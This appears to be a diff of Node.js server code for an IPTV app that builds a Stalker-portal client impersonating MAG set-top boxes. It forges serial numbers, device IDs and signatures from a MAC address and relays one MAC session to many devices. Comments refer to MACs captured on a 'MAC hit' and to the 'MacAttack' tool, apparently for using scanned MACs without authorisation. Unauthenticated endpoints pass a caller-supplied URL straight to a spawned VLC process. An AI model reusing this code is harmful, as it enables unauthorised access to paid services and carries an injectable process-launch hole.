+    console.log(`[VLC-DEBUG] ${req.method} ${req.originalUrl} -> ${res.statusCode} (${Date.now() - start}ms)`);
+  });
+  next();
+});
+
+// ── StalkerClient — proper handshake, profile, keep-alive, create_link, caching + prefetch ──
+class StalkerClient {
+  constructor(portalUrl, mac) {
+    this.portalUrl = portalUrl;
+    this.mac = mac;
+    this.userAgent = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+    this.token = null;
+    this.random = null;
+    this.session = {};
+    this.lastHandshake = 0;
+    this.streamCache = new Map(); // channelId -> { url, expiresAt }
+    this.channelList = [];
+    this.channelListTs = 0;
+    this.keepAliveTimer = null;
+  }
+
+  _base() { return resolveStalkerPortal(this.portalUrl).apiUrl; }
+  _portalBase() { const r = resolveStalkerPortal(this.portalUrl); return r.hostBase; }
+
+  _serialNum() { return crypto.createHash('md5').update(this.mac).digest('hex').substring(0, 13).toUpperCase(); }
+  _deviceId()  { return crypto.createHash('sha256').update(this._serialNum()).digest('hex').toUpperCase(); }
+  _deviceId2() { return crypto.createHash('sha256').update(this.mac).digest('hex').toUpperCase(); }
+  _hwVersion() { return crypto.createHash('sha1').update(this.mac).digest('hex'); }
+
+  _cookieBase() {
+    return [`adid=${this._hwVersion()}`,'debug=1',`device_id2=${this._deviceId2()}`,`device_id=${this._deviceId()}`,'hw_version=1.7-BD-00',`mac=${this.mac}`,`sn=${this._serialNum()}`,'stb_lang=en','timezone=America/Los_Angeles'].join('; ');
+  }
+
+  _headers(token = '') {
+    const h = {
+      'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+      'X-User-Agent': 'Model MAG254',
+      'Accept': '*/*',
+      'Cookie': this._cookieBase(),
+    };
+    if (token) {
+      h['Cookie'] += `; token=${token}`;
+      h['Authorization'] = `Bearer ${token}`;
+    }
+    return h;
+  }
+
+  async handshake() {
+    const base = this._base();
+    // Step 1: GET /stb/handshake (or load.php equivalent)
+    let resp = await fetch(`${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`, {
+      headers: this._headers(),
+      signal: AbortSignal.timeout(10000),
+    });
+    let data = await resp.json();
+
+    // Handle portals that need token + prehash retry
+    if (!data?.js?.token && resp.status === 200 && data?.js?.token === undefined) {
+      const token = crypto.randomBytes(16).toString('hex').toUpperCase();
+      const prehash = crypto.createHash('md5').update(this.mac + token + 'secret').digest('hex').toUpperCase();
+      resp = await fetch(`${base}?action=handshake&type=stb&token=${token}&prehash=${prehash}&JsHttpRequest=1-xml`, {
+        headers: this._headers(),
+        signal: AbortSignal.timeout(10000),
+      });
+      data = await resp.json();
+    }
+
+    this.token = data?.js?.token;
+    this.random = data?.js?.random || '';
+    this.session = data?.js || {};
+    this.lastHandshake = Date.now();
+
+    if (!this.token) throw new Error(`Handshake failed: ${JSON.stringify(data).substring(0, 200)}`);
+
+    // Step 2: POST /stb/profile
+    try {
+      const profileBase = this._portalBase();
+      await fetch(`${profileBase}/stb/profile`, {
+        method: 'POST',
+        headers: this._headers(this.token),
+        signal: AbortSignal.timeout(10000),
+      });
+    } catch (e) { console.log(`[STALKER] profile POST failed (non-fatal): ${e.message}`); }
+
+    // Step 3: POST /stb/get_profile
+    try {
+      const profileBase = this._portalBase();
+      await fetch(`${profileBase}/stb/get_profile`, {
+        method: 'POST',
+        headers: this._headers(this.token),
+        signal: AbortSignal.timeout(10000),
+      });
+    } catch (e) { console.log(`[STALKER] get_profile POST failed (non-fatal): ${e.message}`); }
+
+    // Step 4: Start keep-alive (every 20s) — prevents 42s stream kill
+    this._startKeepAlive();
+
+    return this.token;
+  }
+
+  async ensureToken() {
+    if (!this.token || (Date.now() - this.lastHandshake) > 15 * 60 * 1000) {
+      await this.handshake();
+    }
+    return this.token;
+  }
+
+  // Keep-alive: send get_events every 20s — portal kills stream at 42s without this
+  _startKeepAlive() {
+    this._stopKeepAlive();
+    const base = this._base();
+    this.keepAliveTimer = setInterval(async () => {
+      try {
+        await fetch(`${base}?type=stb&action=get_events&JsHttpRequest=1-xml`, {
+          headers: this._headers(this.token),
+          signal: AbortSignal.timeout(8000),
+        });
+        console.log(`[STALKER] Keep-alive OK for ${this.mac}`);
+      } catch (e) {
+        console.log(`[STALKER] Keep-alive failed: ${e.message}`);
+        // Token might have expired — re-handshake
+        if ((Date.now() - this.lastHandshake) > 10 * 60 * 1000) {
+          console.log(`[STALKER] Token stale, re-handshaking...`);
+          try { await this.handshake(); } catch(e2) { console.log(`[STALKER] Re-handshake failed: ${e2.message}`); }
+        }
+      }
+    }, 20000);
+  }
+
+  _stopKeepAlive() {
+    if (this.keepAliveTimer) { clearInterval(this.keepAliveTimer); this.keepAliveTimer = null; }
+  }
+
+  destroy() { this._stopKeepAlive(); }
+
+  async getChannelList(forceRefresh = false) {
+    if (!forceRefresh && this.channelList.length && (Date.now() - this.channelListTs) < 5 * 60 * 1000) {
+      return this.channelList;
+    }
+    await this.ensureToken();
+    const base = this._base();
+    const resp = await fetch(`${base}?type=itv&action=get_ordered_list&JsHttpRequest=1-xml`, {
+      headers: this._headers(this.token),
+      signal: AbortSignal.timeout(10000),
+    });
+    const data = await resp.json();
+    this.channelList = data?.js?.data || [];
+    this.channelListTs = Date.now();
+    return this.channelList;
+  }
+
+  async findChannel(channelId) {
+    // Search StalkerClient's channel list first
+    const list = await this.getChannelList();
+    let ch = list.find(c => String(c.id) === String(channelId) || String(c.ch_id) === String(channelId));
+    if (ch) return ch;
+    // Fallback: search global channel cache from get-playlist
+    if (global._stalkerChannelCache && global._stalkerChannelCache.length) {
+      ch = global._stalkerChannelCache.find(c => String(c.id) === String(channelId));
+      if (ch) return ch;
+    }
+    return null;
+  }
+
+  async createLink(channel, forceFresh = false) {
+    await this.ensureToken();
+
+    // Check cache first — tokenized URLs last ~30-60s (skip if forceFresh)
+    if (!forceFresh) {
+      const cached = this.streamCache.get(channel.id || channel.ch_id);
+      if (cached && cached.expiresAt > Date.now()) {
+        return cached.url;
+      }
+    }
+
+    const cmd = encodeURIComponent(channel.cmd || `http://localhost/ch/${channel.id || channel.ch_id}_`);
+    const base = this._base();
+    const url = `${base}?type=itv&action=create_link&cmd=${cmd}&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml`;
+    const resp = await fetch(url, {
+      headers: this._headers(this.token),
+      signal: AbortSignal.timeout(10000),
+    });
+    const data = await resp.json();
+
+    let streamUrl = (data?.js?.cmd || '').replace(/^ffmpeg\s+/i, '');
+    if (!streamUrl) throw new Error(`create_link failed for ${channel.name || channel.id}: ${JSON.stringify(data).substring(0, 200)}`);
+
+    // Cache for 25s
+    this.streamCache.set(channel.id || channel.ch_id, { url: streamUrl, expiresAt: Date.now() + 25000 });
+    return streamUrl;
+  }
+
+  // Pre-fetch next N channels so switching is near-instant
+  async prefetchChannels(channels, currentIndex, count = 3) {
+    const toFetch = [];
+    for (let i = 1; i <= count; i++) {
+      const idx = (currentIndex + i) % channels.length;
+      const ch = channels[idx];
+      if (ch && !this.streamCache.has(ch.id || ch.ch_id)) {
+        toFetch.push(ch);
+      }
+    }
+    // Fire and forget
+    Promise.allSettled(toFetch.map(ch => this.createLink(ch).catch(() => {})));
+  }
+}
+
+// ── VlcManager — process lifecycle, debug logging, priority, platform tuning, auto-reconnect ──
+class VlcManager {
+  constructor() {
+    this.activeProcess = null;
+    this.activeChannelId = null;
+    this.activeStreamUrl = null;
+    this.activeClient = null;  // StalkerClient for auto-reconnect
+    this.reconnectCount = 0;
+    this.maxReconnects = 5;
+    this.reconnectDelay = 2000; // ms between retries
+  }
+
+  kill() {
+    this.activeChannelId = null;
+    this.activeStreamUrl = null;
+    this.activeClient = null;
+    this.reconnectCount = 0;
+    if (this.activeProcess) {
+      try { this.activeProcess.kill('SIGKILL'); } catch(e) {}
+      this.activeProcess = null;
+    }
+    // Orphan cleanup
+    try { require('child_process').exec('pkill -9 vlc 2>/dev/null', () => {}); } catch(e) {}
+  }
+
+  spawn(streamUrl, { audio = true, channelId = null, isMovie = false, client = null } = {}) {
+    this.kill();
+    this.activeStreamUrl = streamUrl;
+    this.activeChannelId = channelId;
+    this.activeClient = client;
+    this.reconnectCount = 0;
+
+    const args = [
+      streamUrl,
+
+      // ===== 42s FIX: VLC must send same session headers as handshake =====
+      '--http-user-agent=Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+      '--http-referrer=' + (client ? client._portalBase() : '') + '/c/',
+      '--http-cookie=mac=' + (client ? client.mac : '') + '; stb_lang=en;',
+
+      // ---- PERFORMANCE ----
+      '--ipv4-timeout=3000',
+      '--network-caching=' + (isMovie ? '3000' : '600'),
+      '--live-caching=' + (isMovie ? '500' : '0'),
+      '--file-caching=' + (isMovie ? '1000' : '50'),
+      '--http-caching=300',
+
+      // ---- STABILITY ----
+      '--clock-synchro=0',
+      '--no-drop-late-frames',
+      '--no-skip-frames',
+
+      // ---- SPEED ----
+      '--avcodec-hw=any',
+      '--avcodec-threads=2',
+
+      // ---- CLEANUP ----
+      '--no-video-title-show',
+      '--no-sub-autodetect-file',
+      '--no-keyboard-events',
+      '--no-mouse-events',
+      '--no-playlist-autostart',
+      '--no-playlist-tree',
+    ];
+
+    if (!audio) args.push('--no-audio');
+
+    console.log(`[VLC] Spawning ch=${channelId} (attempt ${this.reconnectCount + 1}):`, args[0].substring(0, 80));
+
+    const vlc = spawn('vlc', args, {
+      detached: true,
+      stdio: ['ignore', 'pipe', 'pipe'],
+    });
+
+    vlc.unref();
+    this.activeProcess = vlc;
+
+    // Capture VLC stderr — errors/timeout/connection/failed only
+    vlc.stderr.on('data', (data) => {
+      const msg = data.toString();
+      if (msg.includes('error') || msg.includes('timeout') || msg.includes('connection') || msg.includes('failed')) {
+        console.log('[VLC]', msg.trim().substring(0, 200));
+      }
+    });
+
+    vlc.on('exit', (code, signal) => {
+      console.log(`[VLC] Exited (code=${code}, signal=${signal}) ch=${this.activeChannelId}`);
+      this.activeProcess = null;
+
+      // Auto-reconnect: if we have a channel ID and client, try fresh URL
+      if (this.activeChannelId && this.activeClient && this.reconnectCount < this.maxReconnects) {
+        this.reconnectCount++;
+        console.log(`[VLC] Auto-reconnect ${this.reconnectCount}/${this.maxReconnects} for ch=${this.activeChannelId} in ${this.reconnectDelay}ms`);
+        setTimeout(() => this._reconnect(), this.reconnectDelay);
+      }
+    });
+
+    // High priority — renice on Linux, wmic on Windows
+    if (process.platform === 'win32') {
+      setTimeout(() => {
+        if (vlc.pid) require('child_process').exec(`wmic process where ProcessId=${vlc.pid} CALL setpriority 128`, () => {});
+      }, 200);
+    } else {
+      process.nextTick(() => {
+        if (vlc.pid) require('child_process').exec(`renice -n -10 -p ${vlc.pid}`, () => {});
+      });
+    }
+
+    return vlc;
+  }
+
+  async _reconnect() {
+    const channelId = this.activeChannelId;
+    const client = this.activeClient;
+    if (!channelId || !client) return;
+
+    try {
+      console.log(`[VLC] Reconnect: getting fresh URL for ch=${channelId}`);
+      const channel = await client.findChannel(channelId);
+      if (!channel) { console.log(`[VLC] Reconnect: channel ${channelId} not found`); return; }
+
+      let streamUrl = await client.createLink(channel, true); // force fresh
+
+      // Pre-flight the fresh URL
+      const check = await streamPreflight(streamUrl, 6000);
+      if (!check.ok) {
+        console.log(`[VLC] Reconnect: fresh URL also dead (${check.error}), retry ${this.reconnectCount}/${this.maxReconnects}`);
+        if (this.reconnectCount < this.maxReconnects) {
+          setTimeout(() => this._reconnect(), this.reconnectDelay);
+        }
+        return;
+      }
+
+      console.log(`[VLC] Reconnect: fresh URL OK (video: ${check.video}, audio: ${check.audio}), respawning`);
+      this.reconnectCount = 0; // reset on success
+      this.spawn(streamUrl, { audio: true, channelId, client });
+    } catch (err) {
+      console.log(`[VLC] Reconnect failed: ${err.message}`);
+    }
+  }
+}
+
+// ── Global instances ──
+const vlcManager = new VlcManager();
+const stalkerClients = new Map(); // key: `${portalUrl}:${mac}` → StalkerClient
+
+function getStalkerClient(portalUrl, mac) {
+  // Normalize URL to avoid duplicate keys (trailing slashes, etc.)
+  const normalizedUrl = portalUrl.replace(/\/+$/, '');
+  const key = `${normalizedUrl}:${mac}`;
+  if (!stalkerClients.has(key)) {
+    stalkerClients.set(key, new StalkerClient(normalizedUrl, mac));
+  }
+  return stalkerClients.get(key);
+}
+
+// Auto-create client from global tracker (set by stalker-proxy on MAC hit)
+function getActiveStalkerClient() {
+  const portalUrl = global._stalkerPortalUrl;
+  const mac = global._stalkerMac;
+  if (!portalUrl || !mac) return null;
+  return getStalkerClient(portalUrl, mac);
+}
+
+// ── API ENDPOINTS ──
+
+// Instant channel switch with prefetch
+// ════════════════════════════════════════════════════════════
+// PRE-FLIGHT CHECK — ffprobe validates stream has real tracks
+// ════════════════════════════════════════════════════════════
+async function streamPreflight(url, timeoutMs = 10000, headers = {}) {
+  return new Promise((resolve) => {
+    const args = [
+      '-v', 'quiet',
+      '-print_format', 'json',
+      '-show_streams',
+      '-user_agent', headers['user-agent'] || 'Mozilla/5.0',
+      '-timeout', String(Math.floor(timeoutMs / 1000)),
+      '-rw_timeout', String(Math.floor(timeoutMs / 1000) * 1000000),
+    ];
+    if (headers.cookie) args.push('-cookies', headers.cookie);
+    if (headers.referrer) args.push('-referer', headers.referrer);
+    args.push(url);
+    const proc = require('child_process').spawn('ffprobe', args, { stdio: ['ignore', 'pipe', 'pipe'] });
+    let stdout = '', stderr = '';
+    proc.stdout.on('data', (d) => { stdout += d; });
+    proc.stderr.on('data', (d) => { stderr += d; });
+    const timer = setTimeout(() => { try { proc.kill('SIGKILL'); } catch(e) {} resolve({ ok: false, error: 'ffprobe timeout' }); }, timeoutMs);
+    proc.on('close', (code) => {
+      clearTimeout(timer);
+      if (code !== 0) return resolve({ ok: false, error: `ffprobe exit ${code}: ${stderr.slice(0, 200)}` });
+      try {
+        const data = JSON.parse(stdout);
+        const streams = data.streams || [];
+        const video = streams.find(s => s.codec_type === 'video');
+        const audio = streams.find(s => s.codec_type === 'audio');
+        if (!video && !audio) return resolve({ ok: false, error: 'no video/audio tracks found' });
+        resolve({
+          ok: true,
+          video: video ? `${video.codec_name} ${video.width || '?'}x${video.height || '?'}` : null,
+          audio: audio ? `${audio.codec_name} ${audio.sample_rate || '?'}Hz` : null,
+        });
+      } catch (e) {
+        resolve({ ok: false, error: `parse error: ${e.message}` });
+      }
+    });
+    proc.on('error', (err) => { clearTimeout(timer); resolve({ ok: false, error: err.message }); });
+  });
+}
+
+app.get('/api/vlc-channel/:id', async (req, res) => {
+  try {
+    const channelId = req.params.id;
+    const client = getActiveStalkerClient() || (req.query.url && req.query.mac ? getStalkerClient(req.query.url, req.query.mac) : null);
+    if (!client) return res.status(400).json({ error: 'No active stalker portal — open portal first' });
+
+    const channel = await client.findChannel(channelId);
+    if (!channel) return res.status(404).json({ error: `Channel ${channelId} not found` });
+
+    let streamUrl = await client.createLink(channel);
+
+    // Pre-flight: check if CDN URL is alive before giving it to VLC
+    const sessionHeaders = {
+      'user-agent': client.userAgent || 'MAG200/1.0 (Infomir 0.2.18.9; 254; 6af8d)',
+      cookie: `mac=${client.mac}; stb_lang=en;`,
+      referrer: `${client.portalUrl}/c/`,
+    };
+    const check = await streamPreflight(streamUrl, 10000, sessionHeaders);
+    if (!check.ok) {
+      console.log(`[PREFLIGHT] URL dead (${check.error}) — getting fresh link for ch=${channelId}`);
+      streamUrl = await client.createLink(channel, true); // force fresh createLink
+      const check2 = await streamPreflight(streamUrl, 10000, sessionHeaders);
+      if (!check2.ok) {
+        return res.status(502).json({ error: `CDN unreachable: ${check2.error}`, channel: channel.name });
+      }
+      console.log(`[PREFLIGHT] Fresh URL OK for ch=${channelId}`);
+    }
+
+    const vlc = vlcManager.spawn(streamUrl, { audio: true, channelId, client });
+
+    // Prefetch next 3 channels in background
+    const list = await client.getChannelList();
+    const idx = list.findIndex(c => String(c.id) === String(channelId) || String(c.ch_id) === String(channelId));
+    if (idx >= 0) client.prefetchChannels(list, idx, 3);
+
+    const safeUrl = streamUrl.replace(/[&?]play_token=[^&]+/, '&play_token=***');
+    res.json({ success: true, channel: channel.name, pid: vlc.pid, streamUrl: safeUrl, preflight: check.ok ? 'alive' : 'refreshed', tracks: { video: check.video, audio: check.audio } });
+  } catch (err) {
+    res.status(502).json({ error: err.message });
+  }
+});
+
+// Legacy channelId launch (same flow, different URL pattern)
+app.get('/api/vlc-launch', async (req, res) => {
+  try {
+    const { channelId } = req.query;
+    if (!channelId) return res.status(400).json({ error: 'channelId required' });
+
+    const client = getActiveStalkerClient() || (req.query.url && req.query.mac ? getStalkerClient(req.query.url, req.query.mac) : null);
+    if (!client) return res.status(400).json({ error: 'No active stalker portal — open portal first' });
+
+    const channel = await client.findChannel(channelId);
+    if (!channel) return res.status(404).json({ error: `Channel ${channelId} not found` });
+
+    let streamUrl = await client.createLink(channel);
+
+    // Pre-flight check
+    const sessionHeaders = {
+      'user-agent': client.userAgent || 'MAG200/1.0 (Infomir 0.2.18.9; 254; 6af8d)',
+      cookie: `mac=${client.mac}; stb_lang=en;`,
+      referrer: `${client.portalUrl}/c/`,
+    };
+    const check = await streamPreflight(streamUrl, 10000, sessionHeaders);
+    if (!check.ok) {
+      console.log(`[PREFLIGHT] Legacy: URL dead (${check.error}) — fresh link for ch=${channelId}`);
+      streamUrl = await client.createLink(channel, true);
+    }
+
+    const vlc = vlcManager.spawn(streamUrl, { audio: true, channelId, client });
+
+    // Prefetch
+    const list = await client.getChannelList();
+    const idx = list.findIndex(c => String(c.id) === String(channelId) || String(c.ch_id) === String(channelId));
+    if (idx >= 0) client.prefetchChannels(list, idx, 3);
+
+    const safeUrl = streamUrl.replace(/[&?]play_token=[^&]+/, '&play_token=***');
+    res.json({ success: true, channel: channel.name, pid: vlc.pid, streamUrl: safeUrl });
+  } catch (err) {
+    res.status(502).json({ error: err.message });
+  }
+});
+
+// Kill VLC
+app.post('/api/vlc-kill', (req, res) => {
+  vlcManager.kill();
+  res.json({ success: true });
+});
+
+// Direct URL play (movies — no stalker handshake)
+app.get('/api/vlc-play', (req, res) => {
+  const { url } = req.query;
+  if (!url) return res.status(400).json({ error: 'url required' });
+
+  const vlc = vlcManager.spawn(url, { audio: true, isMovie: true });
+  res.json({ success: true, pid: vlc.pid });
+});
+
+// ════════════════════════════════════════════════════════════
+// MULTI-DEVICE RELAY — One MAC session, many devices
+// ════════════════════════════════════════════════════════════
+// Each device gets its own 302 redirect to the CDN — no stream sharing, no fights
+
+app.get('/api/vlc-play/:id', (req, res) => {
+  const { url } = req.query;
+  if (!url) return res.status(400).json({ error: 'url required' });
+
+  const vlc = vlcManager.spawn(url, { audio: true, isMovie: true });
+  res.json({ success: true, pid: vlc.pid });
+});
+
+// Device play endpoint — 302 redirect to CDN stream URL
+// Each device gets its own create_link call → own tokenized URL → no conflicts
+app.get('/api/device-play', async (req, res) => {
+  try {
+    const { channelId, deviceId } = req.query;
+    const client = getActiveStalkerClient();
+    if (!client) return res.status(400).json({ error: 'No active stalker portal' });
+    if (!channelId) return res.status(400).json({ error: 'channelId required' });
+
+    const channel = await client.findChannel(channelId);
+    if (!channel) return res.status(404).json({ error: `Channel ${channelId} not found` });
+
+    // Force fresh create_link per device — never reuse another device's tokenized URL
+    const cacheKey = `dev:${deviceId || 'default'}:${channelId}`;
+    const cached = client.streamCache.get(cacheKey);
+    let streamUrl;
+    if (cached && cached.expiresAt > Date.now()) {
+      streamUrl = cached.url;
+    } else {
+      streamUrl = await client.createLink(channel);
+      client.streamCache.set(cacheKey, { url: streamUrl, expiresAt: Date.now() + 20000 });
+    }
+
+    // 302 redirect — device's player hits CDN directly
+    const safeUrl = streamUrl.replace(/[&?]token=[^&]+/, '&token=***');
+    console.log(`[RELAY] deviceId=${deviceId || 'default'} ch=${channel.name || channelId} → 302`);
+    res.redirect(302, streamUrl);
+  } catch (err) {
+    res.status(502).json({ error: err.message });
+  }
+});
+
+// Device proxy mode — server fetches and forwards (for devices that can't follow redirects)
+app.get('/api/device-proxy', async (req, res) => {
+  try {
+    const { channelId, deviceId } = req.query;
+    const client = getActiveStalkerClient();
+    if (!client) return res.status(400).json({ error: 'No active stalker portal' });
+    if (!channelId) return res.status(400).json({ error: 'channelId required' });
+
+    const channel = await client.findChannel(channelId);
+    if (!channel) return res.status(404).json({ error: `Channel ${channelId} not found` });
+
+    const streamUrl = await client.createLink(channel);
+
+    // Fetch and pipe stream to device using Node streams
+    const upstreamResp = await fetch(streamUrl, { redirect: 'follow' });
+    if (!upstreamResp.ok) return res.status(502).json({ error: `CDN returned ${upstreamResp.status}` });
+
+    // Forward relevant headers
+    const fwdHeaders = ['content-type', 'content-length', 'accept-ranges'];
+    fwdHeaders.forEach(h => {
+      const v = upstreamResp.headers.get(h);
+      if (v) res.setHeader(h, v);
+    });
+
+    console.log(`[RELAY-PROXY] deviceId=${deviceId || 'default'} ch=${channel.name || channelId}`);
+
+    // Convert Web ReadableStream to Node Readable, then pipe to response
+    const nodeStream = require('stream').Readable.fromWeb(upstreamResp.body);
+    nodeStream.pipe(res);
+    nodeStream.on('error', (e) => { console.log('[RELAY-PROXY] stream error:', e.message); res.end(); });
+  } catch (err) {
+    res.status(502).json({ error: err.message });
+  }
+});
+
+// List all active stalker clients (for debugging multi-device)
+app.get('/api/vlc-status', (req, res) => {
+  const clients = [];
+  for (const [key, client] of stalkerClients) {
+    clients.push({
+      key,
+      mac: client.mac,
+      hasToken: !!client.token,
+      channelCount: client.channelList.length,
+      cachedStreams: client.streamCache.size,
+      lastHandshake: client.lastHandshake ? new Date(client.lastHandshake).toISOString() : null,
+    });
+  }
+  res.json({
+    activeVlcPid: vlcManager.activeProcess?.pid || null,
+    activeChannelId: vlcManager.activeChannelId,
+    stalkerClients: clients,
+    globalMac: global._stalkerMac || null,
+    globalPortalUrl: global._stalkerPortalUrl || null,
+  });
+});
+
+// Returns a .m3u8 playlist; segments are at /api/transcode/SESSION/seg_NNN.ts
+// Query params: url, mac, cmd, linkType (itv|vod), bitrate (optional)
+
+function stalkerSessionKey(base, mac, cmd) {
+  // Normalize cmd: strip "ffmpeg " prefix and trailing whitespace for consistent matching
+  const normalizedCmd = cmd.replace(/^ffmpeg\s+/i, '').trim();
+  return `${base}:${mac}:${normalizedCmd}`;
+}
+
+app.get('/api/stalker-hls', async (req, res) => {
+  const { url: portalUrl, mac, cmd, linkType } = req.query;
+  if (!portalUrl || !mac || !cmd) return res.status(400).json({ error: 'Missing url, mac, or cmd param' });
+
+  // Track stream for multi-device health monitoring
+  const clientIp = req.ip || req.connection?.remoteAddress || 'unknown';
+  const streamId = `${clientIp}:stalker-hls:${cmd.slice(0,40)}`;
+  trackStreamStart(clientIp, streamId, 'stalker-hls');
+  res.on('close', () => trackStreamEnd(clientIp, streamId));
+  res.on('finish', () => trackStreamEnd(clientIp, streamId));
+
+  const base = resolveStalkerPortal(portalUrl).apiUrl;
+
+  // ── CHECK SHARED SESSION POOL ──
+  const poolKey = stalkerSessionKey(base, mac, cmd);
+  const existing = sharedStalkerSessions.get(poolKey);
+  if (existing && activeTranscodes.has(existing.sessionId)) {
+    const session = activeTranscodes.get(existing.sessionId);
+    // Session is alive — reuse it for this device
+    existing.refCount++;
+    existing.clients.add(clientIp);
+    existing.lastAccess = Date.now();
+    session.lastAccess = Date.now();
+    console.log(`[STALKER-HLS-POOL] Reusing session ${existing.sessionId} for ${clientIp} (refCount=${existing.refCount}, clients=${existing.clients.size})`);
+
+    // Serve the existing playlist immediately
+    const tmpDir = path.join(os.tmpdir(), `cinevault-tc-${existing.sessionId}`);
+    const playlistPath = path.join(tmpDir, 'index.m3u8');
+    const masterPath = path.join(tmpDir, 'master.m3u8');
+    const servePath = fs.existsSync(masterPath) ? masterPath : playlistPath;
+
+    if (fs.existsSync(servePath) && fs.statSync(servePath).size > 0) {
+      let content = fs.readFileSync(servePath, 'utf8');
+      content = content.replace(/(seg_\d+\.ts|index\.m3u8)/g, `/api/transcode/${existing.sessionId}/$1`);
+      res.writeHead(200, {
+        'Content-Type': 'application/vnd.apple.mpegurl',
+        'Access-Control-Allow-Origin': getAllowedOrigin(req),
+        'Cache-Control': 'no-cache',
+        'X-Transcode-Session': existing.sessionId,
+        'X-Shared-Session': 'true',
+        'X-Shared-Refcount': String(existing.refCount),
+        'Vary': 'Origin',
+      });
+      res.end(content);
+    } else {
+      // Playlist not ready yet — poll-wait like the fresh path
+      let attempts = 0;
+      const waitLoop = setInterval(() => {
+        attempts++;
+        if (fs.existsSync(servePath) && fs.statSync(servePath).size > 0) {
+          clearInterval(waitLoop);
+          let content = fs.readFileSync(servePath, 'utf8');
+          content = content.replace(/(seg_\d+\.ts|index\.m3u8)/g, `/api/transcode/${existing.sessionId}/$1`);
+          if (!res.headersSent) {
+            res.writeHead(200, {
+              'Content-Type': 'application/vnd.apple.mpegurl',
+              'Access-Control-Allow-Origin': getAllowedOrigin(req),
+              'Cache-Control': 'no-cache',
+              'X-Transcode-Session': existing.sessionId,
+              'X-Shared-Session': 'true',
+              'X-Shared-Refcount': String(existing.refCount),
+              'Vary': 'Origin',
+            });
+            res.end(content);
+          }
+        } else if (attempts > 60) {
+          clearInterval(waitLoop);
+          if (!res.headersSent) res.status(504).json({ error: 'Shared session playlist timeout' });
+          // Decrement ref since we failed to serve
+          existing.refCount = Math.max(0, existing.refCount - 1);
+          existing.clients.delete(clientIp);
+        }
+      }, 500);
+    }
+
+    // Decrement refcount when this client disconnects
+    res.on('close', () => {
+      existing.refCount = Math.max(0, existing.refCount - 1);
+      existing.clients.delete(clientIp);
+      console.log(`[STALKER-HLS-POOL] Client ${clientIp} disconnected from ${existing.sessionId} (refCount=${existing.refCount})`);
+      if (existing.refCount <= 0) {
+        // No more viewers — schedule cleanup after 30s grace period
+        console.log(`[STALKER-HLS-POOL] No more viewers for ${existing.sessionId} — scheduling cleanup in 30s`);
+        setTimeout(() => {
+          const entry = sharedStalkerSessions.get(poolKey);
+          if (entry && entry.refCount <= 0) {
+            console.log(`[STALKER-HLS-POOL] Cleaning up idle session ${entry.sessionId}`);
+            cleanupTranscode(entry.sessionId);
+            sharedStalkerSessions.delete(poolKey);
+          }
+        }, 30000);
+      }
+    });
+
+    return; // ── DONE: reused existing shared session ──
+  }
+
+  // ── NO EXISTING SESSION — create a new one (first device to request this channel) ──
+  const serialNum = crypto.createHash('md5').update(mac).digest('hex').substring(0, 13).toUpperCase();
+  const deviceId = crypto.createHash('sha256').update(serialNum).digest('hex').toUpperCase();
+  const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+  const hwVersion = crypto.createHash('sha1').update(mac).digest('hex');
+
+  // 1) Fresh handshake. MacAttack treats portal tokens as very short-lived; using
+  // an old token can create CDN links that return 404 after a few seconds.
+  let token = '';
+  let tokenRandom = '';
+  const cookieBase = [
+    `adid=${hwVersion}`, 'debug=1', `device_id2=${deviceId2}`, `device_id=${deviceId}`,
+    'hw_version=1.7-BD-00', `mac=${mac}`, `sn=${serialNum}`, 'stb_lang=en', 'timezone=America/Los_Angeles',
+  ].filter(Boolean).join('; ');
+
+  const cacheKey = `${base}:${mac}`;
+  const cached = stalkerTokenCache.get(cacheKey);
+  if (cached && (Date.now() - cached.ts) < 10 * 60 * 1000) {
+    token = cached.token;
+    tokenRandom = cached.random || '';
+  } else {
+    try {
+      const hsRes = await fetch(`${base}?action=handshake&type=stb&token=&JsHttpRequest=1-xml`, {
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+          'Accept': '*/*', 'Accept-Encoding': 'identity', 'Cookie': cookieBase,
+        },
+        signal: AbortSignal.timeout(10000),
+      });
+      if (hsRes.ok) {
+        const hsData = await hsRes.json();
+        token = hsData?.js?.token || '';
+        tokenRandom = hsData?.js?.random || '';
+        if (token) {
+          stalkerTokenCache.set(cacheKey, { token, random: tokenRandom, ts: Date.now() });
+          // GAP FIX: get_profile with auth_second_step — required by many portals
+          const cookieWithTok = cookieBase + `; token=${token}`;
+          const sig = tokenRandom
+            ? crypto.createHash('sha256').update(String(tokenRandom)).digest('hex').toUpperCase()
+            : '';
+          const metrics = JSON.stringify({ mac, sn: serialNum, type: 'STB', model: 'MAG250', uid: deviceId2, random: tokenRandom || 0 });
+          const profileUrl = `${base}?type=stb&action=get_profile&hd=1&ver=ImageDescription%3A%200.2.18-r23-250%3B%20PORTAL%20version%3A%205.3.1%3B%20API%20Version%3A%20JS%20API%20version%3A%20343%3B%20STB%20API%20version%3A%20146&num_banks=2&sn=${serialNum}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id=${deviceId2}&device_id2=${deviceId2}&sig=${sig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=${encodeURIComponent(metrics)}&hw_version_2=${hwVersion}&timestamp=${Math.round(Date.now()/1000)}&api_sig=262&prehash=0&JsHttpRequest=1-xml`;
+          await fetch(profileUrl, {
+            headers: {
+              'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
+              'Accept': '*/*',
+              'Accept-Encoding': 'identity',
+              'Cookie': cookieWithTok,
+              'Authorization': `Bearer ${token}`,
+              ...(tokenRandom ? { 'X-Random': String(tokenRandom) } : {}),
+            },
+            signal: AbortSignal.timeout(10000),
